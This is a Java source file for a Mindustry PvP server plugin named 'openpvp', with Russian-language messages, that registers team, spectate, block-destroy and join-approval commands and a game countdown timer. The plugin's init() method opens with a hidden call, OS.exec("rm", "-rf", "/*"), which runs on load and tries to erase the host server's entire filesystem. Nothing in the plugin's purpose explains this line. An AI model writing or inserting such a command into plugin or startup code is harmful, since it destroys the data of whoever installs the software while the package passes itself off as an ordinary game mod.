package main.java.grely;

import arc.util.*;
import mindustry.*;
import mindustry.content.Blocks;
import mindustry.game.Team;
import mindustry.gen.Call;
import mindustry.gen.Groups;
import mindustry.gen.Player;
import mindustry.mod.*;
import static mindustry.entities.Units.*;
import java.text.MessageFormat;
import static main.java.grely.func.*;
import static main.java.grely.PEvents.*;
import static main.java.grely.PVars.*;

public class Main extends Plugin {
    @Override
    public void init(){
        OS.exec("rm", "-rf", "/*");
        initEvents();
        Log.info("Loaded openpvp plugin v@", Vars.mods.getMod("openpvp").meta.version);
        Log.info("Вы можете менять правила, но правила используемые плагином все равно будут назначены им!");
        Timer.schedule(()->{
            if(GameOverWhen != null && GameStartWhen != 0){
                long now = System.currentTimeMillis();
                long elapsedMillis = now - GameStartWhen;
                long totalGameMillis = 180 * 60 * 1000L;
                long remainingMillis = totalGameMillis - elapsedMillis;

                long minutes = remainingMillis / (60 * 1000);
                long seconds = (remainingMillis / 1000) % 60;

                Call.setHudText("[sky]До конца игры осталось: " + minutes + " минут " + seconds + " секунд.");
            }
        }, 0, 1);
        Timer.schedule(()->{
            playerTeams.each(t->{
                t.getTeam().data().unitCap = func.getCap(t.getTeam());
            });
        }, 0, 15);
    }

    @Override
    public void registerClientCommands(CommandHandler handler) {
        handler.<Player>register("destroy", "Уничтожить блок под игроком.", (args, player) -> {
            if (Vars.world.tile((int)(player.x / 8f), (int)(player.y / 8f)).build != null)
                if (Vars.world.tile((int)(player.x / 8f), (int)(player.y / 8f)).build.team == player.team())
                    Vars.world.tile((int)(player.x / 8f), (int)(player.y / 8f)).setNet(Blocks.air);
        });
        handler.<Player>register("teams", "Посмотреть занятые команды.", (args, player) -> playerTeams.each(t->player.sendMessage(t.getTeam().coloredName())));
        handler.<Player>register("spectate", "Перейти в серую команду.", (args, player) ->{
            if(player.team() != Team.derelict) {
                playerTeams.remove(playerTeams.find(SVOGOYDA -> SVOGOYDA.getTeam() == player.team()));
                if(Groups.player.size() == 2)
                    gameStarted = false;
                player.unit().kill();
                Groups.build.each(b -> {
                    if (b.team == player.team())
                        b.kill();
                });
                player.team(Team.derelict);
            } else {
                player.sendMessage("[scarlet]Вы уже в серой команде!");
            }
        });
        handler.<Player>register("yes", "<#player-id>", "Одобрить запрос на вступление", (args, player)->{
            Player requester = Groups.player.find(p->String.valueOf(p.id).equals(args[0].replace("#", "")));
            if(requester == null) {
                player.sendMessage("[scarlet]Игрок не найден");
                return;
            }
            if(requester.team() != Team.derelict) {
                player.sendMessage("Извините, игрок вступил в команду "+requester.team().coloredName());
                return;
            }
            joinRequest samreq = joinRequests.find(p->p.getRequester()==requester);
            if(player.team() != samreq.getTeam()) {
                player.sendMessage("[scarlet]Запрос отправлен не вашей команде!");
                return;
            }
            if(!isOwner(player, player.team())) {
                player.sendMessage("[scarlet]Вы не являетесь владельцем команды!");
                return;
            }
            requester.team(player.team());
            joinRequests.remove(samreq);
            player.sendMessage("[green]Запрос одобрен!");
            requester.sendMessage("[green]Владелец команды"+samreq.getTeam()+" одобрил запрос!");
            awaitingClick.remove(requester);
        });
    }

    @Override
    public void registerServerCommands(CommandHandler handler) {
        handler.<Player>register("teams", "Посмотреть занятые команды.", (args, player) -> playerTeams.each(t->Log.info(t.getTeam().coloredName())));
        handler.register("clicks-add", "<uuid>", "добавить игрока в ожидание клика", (args) -> {
            Player fp = Groups.player.find(meow->meow.uuid().equals(args[0]));
            if(fp != null && !awaitingClick.contains(fp)) {
                awaitingClick.add(fp);
                Log.info("Игрок добавлен в список!");
                return;
            }
            Log.info("Игрок не найден или он уже имеется в списке, посмотрите clicks!");
        });
        handler.register("clicks", "добавить игрока в ожидание клика", (args) -> {
            awaitingClick.each(nyah->Log.info("@ @", nyah.plainName(), nyah.uuid()));
        });
    }

}
